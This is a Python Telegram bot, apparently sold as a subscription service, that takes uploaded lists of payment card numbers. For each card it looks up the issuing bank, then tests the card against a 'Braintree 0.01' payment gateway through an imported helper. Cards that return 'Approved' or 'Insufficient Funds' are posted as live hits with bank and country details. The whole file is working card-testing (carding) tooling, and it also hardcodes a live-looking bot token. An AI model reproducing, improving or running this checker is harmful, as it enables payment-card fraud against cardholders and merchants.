import requests,re,time,random,base64
try:
    import telebot
except:
    import os
    os.system("pip install pyTelegramBotAPI")
from telebot import *
from BRAU import Tele
from colorama import Fore
import pytz
from datetime import datetime
ms="2023-10-08:06:18/AM"
sto = {"stop":False}
token = "6473168785:AAFj4T67q9zCxJI7QiiaFEf5U2GUOZVwhVA"
id =  730637876
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
 my_tz = pytz.timezone('Africa/Cairo')
 current_time = datetime.now(my_tz)
 ss=current_time.strftime("%Y-%m-%d:%I:%M/%p")
 print(ss)
 if ss > ms:
        bot.reply_to(message, "الاشترك وقف بس البوت شغال كلمني اجددلك \n @IGFIG")
        exit()
 bot.send_message(message.chat.id,"مرحبا في البوت \nالبوت يعمل معك فقط \n للفحص ارسل فقط كومبو اذا واجهك خطا في الفحص يرجي عمل clean لكومبو بتاعك".format(message.chat.first_name),reply_markup=telebot.types.InlineKeyboardMarkup())
@bot.message_handler(content_types=["document"])
def main(message):
 my_tz = pytz.timezone('Africa/Cairo')
 current_time = datetime.now(my_tz)
 ss=current_time.strftime("%Y-%m-%d:%I:%M/%p")
 print(ss)
 if ss > ms:
        bot.reply_to(message, "الاشترك وقف بس البوت شغال كلمني اجددلك \n @IGFIG")
        exit()
 first_name = message.from_user.first_name
 last_name = message.from_user.last_name
 name=f"{first_name} {last_name}"
 risk=0
 bad=0
 nok=0
 ok = 0
 ko = (bot.reply_to(message,f" WELCOME {name} I WILL NOW START CHECK").message_id)
 ee=bot.download_file(bot.get_file(message.document.file_id).file_path)
 with open("combo.txt","wb") as w:
     w.write(ee)
 print(message.chat.id)
 sto.update({"stop":False})
 if message.chat.id == id:
   with open("combo.txt") as file:
       lino = file.readlines()
       lino = [line.rstrip() for line in lino]
       total = len(lino)
       for cc in lino:
           if sto["stop"] == False:
               pass
           else:
               break
           bin=cc[:6]
           url=f"https://lookup.binlist.net/{bin}"
           try:
           	req=requests.get(url).json()
           except:
           	pass
           try:
           	inf = req['scheme']
           except:
           	inf = "------------"
           try:
           	type = req['type']
           except:
           	type = "-----------"
           try:
           	brand = req['brand']
           except:
           	brand = '-----'
           try:
           	info = inf + '-' + type + '-' + brand
           except:
           	info = "-------"
           try:
           	ii = info.upper()
           except:
           	ii = "----------"
           try:
           	bank = req['bank']['name'].upper()
           except:
           	bank = "--------"
           try:
           	do = req['country']['name'] + ' ' + req['country']['emoji'].upper()
           except:
           	do = "-----------"
           try:
             last = str(Tele(cc))
           except Exception as e:
               print(e)
               try:
                  last = str(Tele(cc))
               except Exception as e:
                  print(e)
                  last="ERROR CC"
           mes = types.InlineKeyboardMarkup(row_width=1)
           mes2 = types.InlineKeyboardMarkup(row_width=1)
           GALD1 = types.InlineKeyboardButton(f"{cc}",callback_data='u8')
           res = types.InlineKeyboardButton(f"• {last} •",callback_data='u1')
           GALD3 = types.InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ : {ok}",callback_data='u2')
           GALD4 = types.InlineKeyboardButton(f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌  : {bad}",callback_data='u1')
           GALD5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 🔥  : {total}",callback_data='u1')
           MY=types.InlineKeyboardButton(f"• ~ 𝘼𝙃𝙈𝙀𝘿 ~ •",url="t.me/IGFIG")
           stop_button = types.InlineKeyboardButton('⭐ STOP 🇾🇪', callback_data='stop')
           @bot.callback_query_handler(func=lambda call: True)
           def start(call):
           	if call.data == "stop":
           		bot.send_message(call.message.chat.id, 'تم ايقاف الكومبو ارسل كومبو اخر')
           		sto.update({"stop": True})
           mes.add(res,GALD1,GALD3,GALD4,GALD5,MY,stop_button)
           bot.edit_message_text(chat_id=message.chat.id,message_id=ko,text=f'''HELLO {name}, PLEASE WAIT FOR CHECK COMBO AND SEND HIT.
    ''',parse_mode='markdown',reply_markup=mes)
           if "risk" in last:
           	bad +=1
           	pass
           	print(Fore.YELLOW+cc+"->"+Fore.CYAN+last)
           elif "Insufficient Funds" in last:
               ok +=1
               respo = f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ (vip)
___________Ahmed__________
𝗖𝗖 ⇾ <code>{cc}</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Insufficient Funds
___________Ahmed__________
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
___________GALD__________
𝗕𝗬:@IGFIG
𝗖𝗛:@TEAM_JO
'''
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
           elif "Status code avs: Gateway Rejected: avs" in last or "Nice! New payment method added:" in last or "Duplicate card exists in the vault." in last or "Approved" in last:
               ok += 1
               respo = (f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ (vip)
___________Ahmed__________
𝗖𝗖 ⇾ <code>{cc}</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree 0.01
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Insufficient Funds
___________Ahmed__________
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {ii}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {do}
___________GALD__________
𝗕𝗬:@IGFIG
𝗖𝗛:@TEAM_JO
''')
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
           else:
                   bad +=1
                   print(Fore.YELLOW+cc+"->"+Fore.RED+last)
       if sto["stop"] == False:
           bot.reply_to(message,'تم فحص الكومبو كامل')
 else:
     bot.reply_to(message,'THE BOT IS PREMIUM CALL ME \n @IGFIG')
print("STARTED BOT @IGFIG ")
bot.polling()

       
